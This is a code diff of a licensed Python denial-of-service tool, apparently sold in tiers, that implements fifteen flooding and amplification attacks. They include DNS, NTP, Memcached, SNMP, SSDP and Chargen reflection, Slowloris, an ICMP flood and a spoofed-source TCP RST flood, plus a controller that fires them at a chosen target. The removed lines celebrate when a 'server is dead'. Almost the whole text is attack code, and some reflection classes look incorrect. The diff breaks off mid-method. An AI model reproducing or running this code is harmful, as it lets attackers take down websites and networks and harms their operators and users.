+                dns = random.choice(self.dns_servers)
+                domain = random.choice(domains)
+                
+                # DNS query for ANY record (amplification)
+                transaction = random.randint(0, 65535)
+                
+                # Build DNS query
+                query = struct.pack('>H', transaction)  # Transaction ID
+                query += struct.pack('>H', 0x0100)      # Flags: recursion desired
+                query += struct.pack('>H', 1)           # Questions: 1
+                query += struct.pack('>H', 0)           # Answer RRs: 0
+                query += struct.pack('>H', 0)           # Authority RRs: 0
+                query += struct.pack('>H', 0)           # Additional RRs: 0
+                
+                # Domain name
+                for part in domain.split('.'):
+                    query += struct.pack('B', len(part))
+                    query += part.encode()
+                query += b'\x00'
+                
+                # Query type: ANY (255) and class: IN (1)
+                query += struct.pack('>HH', 255, 1)
+                
+                # Send with spoofed source IP
+                sock.sendto(query, (dns, 53))
+                self.tracker.add('DNS', self.target_ip, 53, len(query))
+                
+            except:
+                pass
+
+# ==================== ATTACK 7: NTP ====================
+
+class NTPAttack(AttackBase):
+    """NTP amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
+        
+        # NTP servers
+        self.ntp_servers = [
+            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org',
+            'time.google.com', 'time.windows.com', 'time.apple.com'
+        ]
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        # NTP monlist request (amplification factor ~200x)
+        monlist = b'\x17\x00\x03\x2a' + b'\x00' * 4
+        
+        while self.running:
+            try:
+                ntp = random.choice(self.ntp_servers)
+                sock.sendto(monlist, (ntp, 123))
+                self.tracker.add('NTP', self.target_ip, 123, len(monlist))
+            except:
+                pass
+
+# ==================== ATTACK 8: SLOWLORIS ====================
+
+class SlowlorisAttack(AttackBase):
+    """Slowloris attack"""
+    
+    def start(self, target, threads):
+        super().start()
+        parsed = urlparse(target)
+        self.host = parsed.netloc or parsed.path
+        if ':' in self.host:
+            self.host = self.host.split(':')[0]
+        self.port = parsed.port or 80
+        
+        self.connections = []
+        self.conn_lock = Lock()
+        
+        # Keeper thread
+        threading.Thread(target=self.keeper, daemon=True).start()
+        
+        # Worker threads
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Create connections"""
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((self.host, self.port))
+                
+                # Partial request
+                req = f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
+                req += f"Host: {self.host}\r\n"
+                req += f"User-Agent: 7VENTY7VEN\r\n"
+                req += "Accept: */*\r\n"
+                req += "Connection: keep-alive\r\n"
+                
+                sock.send(req.encode())
+                
+                with self.conn_lock:
+                    self.connections.append(sock)
+                
+                self.tracker.add('SLOWLORIS', self.host, self.port)
+                
+            except:
+                pass
+            time.sleep(random.uniform(0.5, 2))
+    
+    def keeper(self):
+        """Keep connections alive"""
+        while self.running:
+            dead = []
+            with self.conn_lock:
+                for sock in self.connections[:]:
+                    try:
+                        sock.send(f"X-{random.randint(1,999)}: {random.randint(1,999)}\r\n".encode())
+                    except:
+                        dead.append(sock)
+                
+                for d in dead:
+                    if d in self.connections:
+                        self.connections.remove(d)
+            
+            time.sleep(10)
+    
+    def stop(self):
+        super().stop()
+        with self.conn_lock:
+            for sock in self.connections:
                 try:
                     sock.close()
                 except:
                     pass
-            self.slowloris_connections.clear()
-        
-        for s in self.socket_pool:
-            try:
-                s.close()
-            except:
-                pass
-        
-        if self.raw_socket:
-            try:
-                self.raw_socket.close()
-            except:
-                pass
-        
-        for t in self.thread_pool:
-            try:
-                t.join(timeout=1)
-            except:
-                pass
-        
-        # Export hits log
-        if self.hit_tracker.hit_count > 0:
-            filename = f"hits_log_{int(time.time())}.json"
-            self.hit_tracker.export_hits(filename)
-            self.error_handler.log(ErrorLevel.SUCCESS, f"Hit log saved to {filename}")
+            self.connections.clear()
     
-    def check_server_alive(self, target):
-        """Check if server is alive"""
+    def get_count(self):
+        with self.conn_lock:
+            return len(self.connections)
+
+# ==================== ATTACK 9: ICMP ====================
+
+class ICMPAttack(AttackBase):
+    """ICMP flood attack (ping flood)"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
         try:
-            parsed = urlparse(target)
-            host = parsed.netloc or parsed.path
-            if ':' in host:
-                host = host.split(':')[0]
-            
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            result = sock.connect_ex((host, 80))
-            sock.close()
-            return result == 0
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         except:
-            return False
-    
-    def death_monitor(self, target):
-        """Monitor for server death"""
-        consecutive_errors = 0
+            return
         
-        while self.running and not self.death_detected:
-            time.sleep(self.death_check_interval)
-            
-            alive = self.check_server_alive(target)
-            
-            if not alive:
-                consecutive_errors += 1
-                if consecutive_errors >= self.death_error_threshold:
-                    self.death_detected = True
-                    self.server_down = True
-                    self.final_hit_count = self.hit_tracker.hit_count
-                    
-                    time_to_death = time.time() - self.start_time
-                    minutes = int(time_to_death // 60)
-                    seconds = int(time_to_death % 60)
-                    
-                    print(f"\n{Colors.RED}{Colors.BOLD}")
-                    print("╔═══════════════════════════════════════════════════════════════════╗")
-                    print("║                                                                   ║")
-                    print("║                      💀 SERVER IS DEAD! 💀                         ║")
-                    print("║                                                                   ║")
-                    print("╠═══════════════════════════════════════════════════════════════════╣")
-                    print(f"║  🎯 FINAL HITS: {self.final_hit_count:<8}                                          ║")
-                    print(f"║  ⏱️  TIME TO DEATH: {minutes}m {seconds}s                                         ║")
-                    print(f"║  📊 HIT RATE: {self.final_hit_count/time_to_death:.1f} hits/s                                    ║")
-                    print("║                                                                   ║")
-                    print("║  🔥 SERVER HAS FALLEN - MISSION ACCOMPLISHED! 🔥                 ║")
-                    print("║                                                                   ║")
-                    print("╚═══════════════════════════════════════════════════════════════════╝")
-                    print(f"{Colors.END}")
-                    
-                    self.running = False
-                    break
-            else:
-                consecutive_errors = max(0, consecutive_errors - 1)
-    
-    # ==================== FIXED SLOWLORIS METHOD ====================
-    
-    def slowloris(self, target, threads):
-        """FIXED Slowloris attack - Actually works!"""
-        parsed = urlparse(target)
-        host = parsed.netloc or parsed.path
-        if ':' in host:
-            host = host.split(':')[0]
-        port = 80
-        
-        self.error_handler.log(ErrorLevel.INFO, f"Starting FIXED Slowloris attack on {host}:{port}")
-        
-        def create_slowloris_connection():
-            """Create a single Slowloris connection"""
+        while self.running:
             try:
-                # Create socket
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10)
+                # ICMP echo request
+                icmp_type = 8  # echo request
+                icmp_code = 0
+                icmp_checksum = 0
+                icmp_id = random.randint(0, 65535)
+                icmp_seq = random.randint(0, 65535)
                 
-                # Connect to server
-                sock.connect((host, port))
+                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+                data = os.urandom(56)
                 
-                # Send partial HTTP request (NO trailing \r\n\r\n)
-                request = f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
-                request += f"Host: {host}\r\n"
-                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
-                request += "Accept: text/html,application/xhtml+xml\r\n"
-                request += "Accept-Language: en-US,en\r\n"
-                request += "Connection: keep-alive\r\n"
+                # Calculate checksum
+                checksum = self.checksum(header + data)
+                header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                 
-                # IMPORTANT: Don't send the final \r\n\r\n
-                sock.send(request.encode())
+                packet = header + data
+                sock.sendto(packet, (self.target_ip, 0))
+                self.tracker.add('ICMP', self.target_ip, 0, len(packet))
                 
-                # Add to connections list
-                with self.slowloris_lock:
-                    self.slowloris_connections.append(sock)
-                    
-                # Record hit
-                self.hit_tracker.record_hit('SLOWLORIS', host, port, "connection opened")
-                
-                with self.lock:
-                    self.stats['SLOWLORIS'] += 1
-                    self.stats['total'] += 1
-                    self.stats['hits'] += 1
-                
-                return sock
-            except Exception as e:
-                with self.lock:
-                    self.stats['errors'] += 1
-                return None
+            except:
+                pass
+    
+    def checksum(self, data):
+        """Calculate checksum"""
+        if len(data) % 2 != 0:
+            data += b'\x00'
         
-        def slowloris_keeper():
-            """Keep connections alive by sending headers"""
-            while self.running and not self.server_down:
-                dead_connections = []
-                
-                with self.slowloris_lock:
-                    for sock in self.slowloris_connections:
-                        try:
-                            # Send a random header to keep connection alive
-                            header = f"X-{random.randint(1,999999)}: {random.randint(1,999999)}\r\n"
-                            sock.send(header.encode())
-                        except:
-                            dead_connections.append(sock)
-                    
-                    # Remove dead connections
-                    for dead in dead_connections:
-                        try:
-                            self.slowloris_connections.remove(dead)
-                            dead.close()
-                        except:
-                            pass
-                
-                # Create new connections to maintain count
-                current_count = len(self.slowloris_connections)
-                target_count = threads * 5  # Aim for 5x connections per thread
-                
-                if current_count < target_count:
-                    for _ in range(min(10, target_count - current_count)):
-                        create_slowloris_connection()
-                        time.sleep(0.1)
-                
-                time.sleep(10)  # Send headers every 10 seconds
+        s = 0
+        for i in range(0, len(data), 2):
+            word = (data[i] << 8) + data[i+1]
+            s += word
         
-        def slowloris_worker():
-            """Worker thread - creates new connections"""
-            while self.running and not self.server_down:
-                create_slowloris_connection()
-                time.sleep(random.uniform(0.5, 2))  # Random delay between connections
+        s = (s >> 16) + (s & 0xffff)
+        s = ~s & 0xffff
+        return s
+
+# ==================== ATTACK 10: MEMCACHED ====================
+
+class MemcachedAttack(AttackBase):
+    """Memcached amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
         
-        # Start keeper thread
-        keeper_thread = threading.Thread(target=slowloris_keeper)
-        keeper_thread.daemon = True
-        keeper_thread.start()
-        self.thread_pool.append(keeper_thread)
+        # Memcached servers (known vulnerable)
+        self.memcached_servers = []
+        for i in range(1, 255):
+            self.memcached_servers.append(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
         
-        # Start worker threads
-        for i in range(threads):
-            t = threading.Thread(target=slowloris_worker)
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
             t.daemon = True
             t.start()
-            self.thread_pool.append(t)
-        
-        self.error_handler.log(ErrorLevel.SUCCESS, f"FIXED Slowloris: {threads} threads active")
+            self.threads.append(t)
     
-    def http_flood(self, target, threads, use_https=False):
-        """HTTP/HTTPS flood attack with hit tracking"""
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        # Memcached stats command (amplification)
+        stats = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
+        
+        while self.running:
+            try:
+                server = random.choice(self.memcached_servers)
+                sock.sendto(stats, (server, 11211))
+                self.tracker.add('MEMCACHED', self.target_ip, 11211, len(stats))
+            except:
+                pass
+
+# ==================== ATTACK 11: SSDP ====================
+
+class SSDPAttack(AttackBase):
+    """SSDP amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        # SSDP discovery request
+        ssdp = b'M-SEARCH * HTTP/1.1\r\n'
+        ssdp += b'HOST: 239.255.255.250:1900\r\n'
+        ssdp += b'MAN: "ssdp:discover"\r\n'
+        ssdp += b'MX: 1\r\n'
+        ssdp += b'ST: ssdp:all\r\n\r\n'
+        
+        while self.running:
+            try:
+                sock.sendto(ssdp, ('239.255.255.250', 1900))
+                self.tracker.add('SSDP', self.target_ip, 1900, len(ssdp))
+            except:
+                pass
+
+# ==================== ATTACK 12: SNMP ====================
+
+class SNMPAttack(AttackBase):
+    """SNMP amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
+        
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        # SNMP GetBulk request (amplification)
+        # Version: 2c, Community: public, GetBulk request
+        snmp = bytes.fromhex('302902010104067075626c6963a51c02046b053d46020100020100300e300c06082b060102010101000500')
+        
+        while self.running:
+            try:
+                sock.sendto(snmp, (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 161))
+                self.tracker.add('SNMP', self.target_ip, 161, len(snmp))
+            except:
+                pass
+
+# ==================== ATTACK 13: WEBSOCKET ====================
+
+class WebSocketAttack(AttackBase):
+    """WebSocket flood attack"""
+    
+    def start(self, target, threads):
+        super().start()
         parsed = urlparse(target)
-        host = parsed.netloc or parsed.path
-        if ':' in host:
-            host = host.split(':')[0]
-        port = 443 if use_https else 80
+        self.host = parsed.netloc or parsed.path
+        if ':' in self.host:
+            self.host = self.host.split(':')[0]
+        self.port = parsed.port or 80
         
-        def worker():
-            session = requests.Session()
-            while self.running and not self.server_down:
-                try:
-                    url = target.rstrip('/') + random.choice(self.paths)
-                    if use_https and not url.startswith('https'):
-                        url = url.replace('http://', 'https://')
-                    
-                    headers = {
-                        'User-Agent': random.choice(self.user_agents),
-                        'Accept': '*/*',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'Connection': 'keep-alive',
-                        'Cache-Control': 'no-cache',
-                    }
-                    
-                    method = random.choice(['GET', 'POST', 'HEAD'])
-                    
-                    if method == 'GET':
-                        r = session.get(url, headers=headers, timeout=2, verify=False)
-                    elif method == 'POST':
-                        r = session.post(url, headers=headers, data={'key': 'value'}, timeout=2, verify=False)
-                    else:
-                        r = session.head(url, headers=headers, timeout=2, verify=False)
-                    
-                    # Record hit if successful
-                    if r.status_code < 500:
-                        method_name = 'HTTPS' if use_https else 'HTTP'
-                        self.hit_tracker.record_hit(method_name, host, port, method)
-                    
-                    with self.lock:
-                        method_name = 'HTTPS' if use_https else 'HTTP'
-                        self.stats[method_name] += 1
-                        self.stats['total'] += 1
-                        self.stats['bandwidth'] += len(r.content) if r.content else 0
-                        self.stats['hits'] += 1 if r.status_code < 500 else 0
-                        
-                except Exception:
-                    with self.lock:
-                        self.stats['errors'] += 1
-        
-        for i in range(min(threads, self.performance['max_threads'])):
-            t = threading.Thread(target=worker)
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
             t.daemon = True
             t.start()
-            self.thread_pool.append(t)
+            self.threads.append(t)
     
-    def udp_flood(self, target_ip, port, threads):
-        """UDP flood attack with hit tracking"""
-        def worker():
-            sock = self.safe_socket('udp')
-            if not sock:
-                return
-            
-            while self.running and not self.server_down:
-                try:
-                    size = random.randint(64, self.performance['packet_size'])
-                    data = os.urandom(size)
-                    sock.sendto(data, (target_ip, port))
-                    
-                    self.hit_tracker.record_hit('UDP', target_ip, port, 'flood')
-                    
-                    with self.lock:
-                        self.stats['UDP'] += 1
-                        self.stats['total'] += 1
-                        self.stats['bandwidth'] += size
-                        self.stats['hits'] += 1
-                        
-                except Exception:
-                    with self.lock:
-                        self.stats['errors'] += 1
+    def worker(self):
+        """Worker thread"""
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.connect((self.host, self.port))
+                
+                # WebSocket upgrade request
+                key = base64.b64encode(os.urandom(16)).decode()
+                
+                req = f"GET / HTTP/1.1\r\n"
+                req += f"Host: {self.host}\r\n"
+                req += "Upgrade: websocket\r\n"
+                req += "Connection: Upgrade\r\n"
+                req += f"Sec-WebSocket-Key: {key}\r\n"
+                req += "Sec-WebSocket-Version: 13\r\n\r\n"
+                
+                sock.send(req.encode())
+                
+                # Receive response
+                sock.recv(1024)
+                
+                # Send ping frames
+                for _ in range(10):
+                    try:
+                        # Ping frame
+                        ping = b'\x89' + struct.pack('B', 0)
+                        sock.send(ping)
+                        self.tracker.add('WEBSOCKET', self.host, self.port)
+                        time.sleep(0.1)
+                    except:
+                        break
+                
+                sock.close()
+                
+            except:
+                pass
+            time.sleep(0.5)
+
+# ==================== ATTACK 14: RST ====================
+
+class RSTAttack(AttackBase):
+    """TCP RST flood attack"""
+    
+    def start(self, target_ip, port, threads):
+        super().start()
+        self.target_ip = target_ip
+        self.port = port
         
-        for i in range(min(threads, self.performance['max_threads'])):
-            t = threading.Thread(target=worker)
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
             t.daemon = True
             t.start()
-            self.thread_pool.append(t)
+            self.threads.append(t)
     
-    def infinite_combo(self, target, intensity='ultimate', methods=None):
-        """INFINITE MODE - Runs until server dies"""
+    def worker(self):
+        """Worker thread"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        except:
+            return
         
-        # Intensity settings
-        settings = {
-            'low': {'threads': 10, 'multiplier': 0.5},
-            'medium': {'threads': 25, 'multiplier': 1.0},
-            'high': {'threads': 50, 'multiplier': 1.5},
-            'seven': {'threads': 100, 'multiplier': 2.0},
-            'ultimate': {'threads': 200, 'multiplier': 3.0}
-        }
+        while self.running:
+            try:
+                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                src_port = random.randint(1024, 65535)
+                seq = random.randint(0, 4294967295)
+                
+                # IP header
+                ip_header = struct.pack(
+                    '!BBHHHBBH4s4s',
+                    0x45, 0,
+                    40, random.randint(1,65535),
+                    0, 64, 6, 0,
+                    socket.inet_aton(src_ip),
+                    socket.inet_aton(self.target_ip)
+                )
+                
+                # TCP header with RST flag
+                tcp_header = struct.pack(
+                    '!HHLLBBHHH',
+                    src_port, self.port,
+                    seq, 0,
+                    0x50, 0x04,
+                    0, 0, 0
+                )
+                
+                packet = ip_header + tcp_header
+                sock.sendto(packet, (self.target_ip, 0))
+                self.tracker.add('RST', self.target_ip, self.port)
+                
+            except:
+                pass
+
+# ==================== ATTACK 15: CHARGEN ====================
+
+class ChargenAttack(AttackBase):
+    """Chargen amplification attack"""
+    
+    def start(self, target_ip, threads):
+        super().start()
+        self.target_ip = target_ip
         
-        cfg = settings[intensity]
-        self.running = True
-        self.start_time = time.time()
-        self.server_down = False
-        self.death_detected = False
+        for _ in range(threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+    
+    def worker(self):
+        """Worker thread"""
+        sock = self.create_socket('udp')
+        if not sock:
+            return
+        
+        while self.running:
+            try:
+                # Chargen request (any data)
+                data = b'\x00'
+                sock.sendto(data, (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 19))
+                self.tracker.add('CHARGEN', self.target_ip, 19, 1)
+            except:
+                pass
+
+# ==================== MAIN HAMMER ====================
+
+class UltimateHammer:
+    """Main controller with ALL 15 methods"""
+    
+    def __init__(self):
+        # License
+        self.license = LicenseManager()
+        
+        if not self.license.is_valid:
+            sys.exit(1)
+        
+        self.tracker = HitTracker()
+        self.attacks = {}
+        self.running = False
+        
+        # Check root for certain methods
+        self.root_required = ['TCP_SYN', 'TCP_ACK', 'DNS', 'NTP', 'ICMP', 
+                              'MEMCACHED', 'SSDP', 'SNMP', 'RST', 'CHARGEN']
+        
+        self.show_banner()
+    
+    def show_banner(self):
+        """Show banner"""
+        print(f"""
+{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║     █████╗  █████╗ ███████╗██╗   ██╗███████╗███╗   ██╗████████╗   ║
+║    ██╔══██╗██╔══██╗██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝   ║
+║    ███████║██║  ╚═╝█████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║      ║
+║    ██╔══██║██║  ██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║      ║
+║    ██║  ██║╚█████╔╝███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║      ║
+║    ╚═╝  ╚═╝ ╚════╝ ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝      ║
+║                                                                   ║
+║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ║
+║              🔥 ULTIMATE v21.0 - ALL 15 METHODS 🔥               ║
+║                   👑 BY: 7VENTY7VEN 👑                           ║
+║              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  ║
+║                                                                   ║
+║  🔑 LICENSE: {self.license.type.value.upper():<15}                               ║
+║  💻 HARDWARE: {self.license.hardware_id[:16]}...                      ║
+║  👑 ROOT: {'YES' if self.license.is_root else 'NO'} (required for 10 methods)          ║
+║                                                                   ║
+║  ⚡ AVAILABLE METHODS:                                            ║
+║  🌐 HTTP      🔒 HTTPS    💧 UDP      📡 TCP_SYN  📨 TCP_ACK    ║
+║  🌍 DNS       ⏰ NTP       🐌 SLOWLORIS 📶 ICMP     💾 MEMCACHED ║
+║  📺 SSDP      🔧 SNMP      🔌 WEBSOCKET 💥 RST      ⚡ CHARGEN   ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
+        """)
+    
+    def start(self, target, methods=None, intensity='medium'):
+        """Start attack"""
         
         # Parse target
+        if not target.startswith(('http://', 'https://')):
+            target = f"http://{target}"
+        
         parsed = urlparse(target)
         host = parsed.netloc or parsed.path
         if ':' in host:
             host = host.split(':')[0]
         
+        # Get IP
         try:
             target_ip = socket.gethostbyname(host)
         except:
             target_ip = host
         
-        # Default methods
-        if methods is None:
-            if self.performance['is_root']:
-                methods = ['HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'SLOWLORIS']
+        # Intensity settings
+        settings = {
+            'low': 10, 'medium': 25, 'high': 50,
+            'extreme': 100, 'insane': 200, 'ultimate': 500
+        }
+        base_threads = settings.get(intensity, 25)
+        
+        # Check license limits
+        if self.license.type == LicenseType.TRIAL:
+            base_threads = min(base_threads, 50)
+        elif self.license.type == LicenseType.PRO:
+            base_threads = min(base_threads, 200)
+        
+        # Default methods based on license
+        if not methods:
+            if self.license.type == LicenseType.ENTERPRISE or self.license.type == LicenseType.LIFETIME:
+                methods = ['SLOWLORIS', 'HTTP', 'HTTPS', 'UDP', 'TCP_SYN', 'TCP_ACK', 
+                          'DNS', 'NTP', 'ICMP', 'MEMCACHED', 'SSDP', 'SNMP', 
+                          'WEBSOCKET', 'RST', 'CHARGEN']
+            elif self.license.type == LicenseType.PRO:
+                methods = ['SLOWLORIS', 'HTTP', 'HTTPS', 'UDP', 'WEBSOCKET']
             else:
-                methods = ['HTTP', 'HTTPS', 'UDP', 'SLOWLORIS']
+                methods = ['SLOWLORIS', 'HTTP']  # Trial
         
-        # Print banner
-        self.print_infinite_banner(target, cfg, intensity, methods)
+        self.running = True
         
-        # Launch attacks
+        # Start selected attacks
         for method in methods:
-            threads = int(cfg['threads'] * cfg['multiplier'])
+            threads = base_threads
             
-            if method == 'HTTP':
-                self.http_flood(target, threads)
-                self.error_handler.log(ErrorLevel.INFO, f"Started HTTP flood with {threads} threads")
-            elif method == 'HTTPS':
-                self.http_flood(target, threads, use_https=True)
-                self.error_handler.log(ErrorLevel.INFO, f"Started HTTPS flood with {threads} threads")
-            elif method == 'UDP':
-                self.udp_flood(target_ip, 80, threads)
-                self.error_handler.log(ErrorLevel.INFO, f"Started UDP flood with {threads} threads")
-            elif method == 'SLOWLORIS':
-                slow_threads = max(10, threads // 4)  # Slowloris needs fewer threads
-                self.slowloris(target, slow_threads)
-                self.error_handler.log(ErrorLevel.INFO, f"Started FIXED Slowloris with {slow_threads} threads")
-            elif method == 'TCP_SYN' and self.performance['is_root']:
-                self.tcp_syn_flood(target_ip, 80, threads)
-        
-        # Start death monitor
-        death_thread = threading.Thread(target=self.death_monitor, args=(target,))
-        death_thread.daemon = True
-        death_thread.start()
-        
-        # Status updater
-        status_thread = threading.Thread(target=self.infinite_status_updater)
-        status_thread.daemon = True
-        status_thread.start()
-        
-        # Wait for death
-        death_thread.join()
-        
-        # Cleanup and finale
-        self.cleanup()
-        self.print_death_finale()
-        self.error_handler.print_summary()
-    
-    def infinite_status_updater(self):
-        """Status updater for infinite mode"""
-        last_total = 0
-        last_time = time.time()
-        
-        while self.running and not self.death_detected:
+            # Adjust threads per method
+            if method in ['TCP_SYN', 'TCP_ACK', 'RST']:
+                threads = max(5, threads // 4)
+            
+            # Check root requirement
+            if method in self.root_required and not self.license.is_root:
+                print(f"{Colors.YELLOW}⚠️  {method} requires root - skipping{Colors.END}")
+                continue
+            
             try:
-                current_time = time.time()
-                elapsed = current_time - self.start_time
+                if method == 'HTTP':
+                    a = HTTPAttack(self.tracker)
+                    a.start(target, threads)
+                    self.attacks['HTTP'] = a
+                    print(f"{Colors.GREEN}✅ HTTP started ({threads} threads){Colors.END}")
                 
-                with self.lock:
-                    total = self.stats['total']
-                    errors = self.stats['errors']
-                    bandwidth = self.stats['bandwidth']
-                    hits = self.stats['hits']
+                elif method == 'HTTPS':
+                    a = HTTPSAttack(self.tracker)
+                    a.start(target, threads)
+                    self.attacks['HTTPS'] = a
+                    print(f"{Colors.GREEN}✅ HTTPS started ({threads} threads){Colors.END}")
                 
-                # Calculate rate
-                if current_time - last_time > 0:
-                    rate = (total - last_total) / (current_time - last_time)
-                    last_total = total
-                    last_time = current_time
-                else:
-                    rate = 0
+                elif method == 'UDP':
+                    a = UDPAttack(self.tracker)
+                    a.start(target_ip, parsed.port or 80, threads)
+                    self.attacks['UDP'] = a
+                    print(f"{Colors.GREEN}✅ UDP started ({threads} threads){Colors.END}")
                 
-                # Hit rate
-                hit_rate = self.hit_tracker.get_hit_rate(10)
+                elif method == 'TCP_SYN':
+                    a = SYNAttack(self.tracker)
+                    a.start(target_ip, parsed.port or 80, threads)
+                    self.attacks['TCP_SYN'] = a
+                    print(f"{Colors.GREEN}✅ TCP_SYN started ({threads} threads){Colors.END}")
                 
-                # Bandwidth rate
-                bw_rate = bandwidth / elapsed if elapsed > 0 else 0
+                elif method == 'TCP_ACK':
+                    a = ACKAttack(self.tracker)
+                    a.start(target_ip, parsed.port or 80, threads)
+                    self.attacks['TCP_ACK'] = a
+                    print(f"{Colors.GREEN}✅ TCP_ACK started ({threads} threads){Colors.END}")
                 
-                # Add Slowloris active connections to stats
-                slowloris_active = len(self.slowloris_connections)
+                elif method == 'DNS':
+                    a = DNSAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['DNS'] = a
+                    print(f"{Colors.GREEN}✅ DNS started ({threads} threads){Colors.END}")
                 
-                # Clear and print main status
-                sys.stdout.write('\033[2J\033[H')
-                self.print_infinite_status(elapsed, total, rate, errors, bw_rate, hits, hit_rate, slowloris_active)
-                sys.stdout.flush()
+                elif method == 'NTP':
+                    a = NTPAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['NTP'] = a
+                    print(f"{Colors.GREEN}✅ NTP started ({threads} threads){Colors.END}")
+                
+                elif method == 'SLOWLORIS':
+                    a = SlowlorisAttack(self.tracker)
+                    a.start(target, max(10, threads // 4))
+                    self.attacks['SLOWLORIS'] = a
+                    print(f"{Colors.GREEN}✅ SLOWLORIS started ({max(10, threads // 4)} threads){Colors.END}")
+                
+                elif method == 'ICMP':
+                    a = ICMPAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['ICMP'] = a
+                    print(f"{Colors.GREEN}✅ ICMP started ({threads} threads){Colors.END}")
+                
+                elif method == 'MEMCACHED':
+                    a = MemcachedAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['MEMCACHED'] = a
+                    print(f"{Colors.GREEN}✅ MEMCACHED started ({threads} threads){Colors.END}")
+                
+                elif method == 'SSDP':
+                    a = SSDPAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['SSDP'] = a
+                    print(f"{Colors.GREEN}✅ SSDP started ({threads} threads){Colors.END}")
+                
+                elif method == 'SNMP':
+                    a = SNMPAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['SNMP'] = a
+                    print(f"{Colors.GREEN}✅ SNMP started ({threads} threads){Colors.END}")
+                
+                elif method == 'WEBSOCKET':
+                    a = WebSocketAttack(self.tracker)
+                    a.start(target, threads)
+                    self.attacks['WEBSOCKET'] = a
+                    print(f"{Colors.GREEN}✅ WEBSOCKET started ({threads} threads){Colors.END}")
+                
+                elif method == 'RST':
+                    a = RSTAttack(self.tracker)
+                    a.start(target_ip, parsed.port or 80, threads)
+                    self.attacks['RST'] = a
+                    print(f"{Colors.GREEN}✅ RST started ({threads} threads){Colors.END}")
+                
+                elif method == 'CHARGEN':
+                    a = ChargenAttack(self.tracker)
+                    a.start(target_ip, threads)
+                    self.attacks['CHARGEN'] = a
+                    print(f"{Colors.GREEN}✅ CHARGEN started ({threads} threads){Colors.END}")
+                    
+            except Exception as e:
+                print(f"{Colors.RED}❌ Failed to start {method}: {e}{Colors.END}")
+        
+        print(f"\n{Colors.CYAN}⚡ Attack running! Press Ctrl+C to stop{Colors.END}\n")
+        
+        # Status display
+        self.display()
+    
+    def display(self):
